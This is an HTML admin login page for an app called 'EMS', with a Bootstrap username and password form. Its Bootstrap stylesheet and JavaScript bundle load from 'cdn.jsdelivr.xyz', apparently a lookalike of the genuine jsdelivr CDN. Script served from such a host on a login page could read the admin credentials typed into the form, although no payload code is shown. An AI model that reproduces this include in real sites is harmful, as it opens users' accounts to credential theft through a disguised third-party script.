<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EMS</title>
<link rel="stylesheet" href="https://cdn.jsdelivr.xyz/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="style.css">
</head>
<body class="bg-light">
 <div class="container">
    <div class="row justify-content-center">
        <div class="col-md-4 mt-5  ">
        <div class="card mt-5">
        <!-- header -->
            <div class="card-header text-bg-primary">
                login as admin
            </div>
            <!--body-->
        <div class="card-body">
            <form action="dash.html">
                <!-- user name -->
                <div class="form-floating mb-3" >
                    <input  type="text"id="username" class="form-control " autofocus placeholder="">
                    
                    <label for="username"> User Name</label>
                </div>
                <!--password-->
                    <div class="form-floating mb-3">
                        <input type="password" id="password" class="form-control" autofocus placeholder="">
                        <label for="password">password</label>
                    </div>
                        <!-- remember me -->
                        <div class="form-check mb-3">
                            <input type="checkbox" class="form-check-input" id="remember me">
                            <label for="remember me">Remember me</label>
                        </div>
                        <!-- submit button -->
                                <div class="d-grid">
                                    <button type="submit" class="btn btn-success">
                                        <i class="fa fa-sign-out" aria-hidden="true"></i>
                                        login as admin
                                    </button>
                                </div>
            </form>
        </div>
        </div>
        </div>
    </div>
 </div>



    <script src="https://cdn.jsdelivr.xyz/npm/bootstrap@5.3.1/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
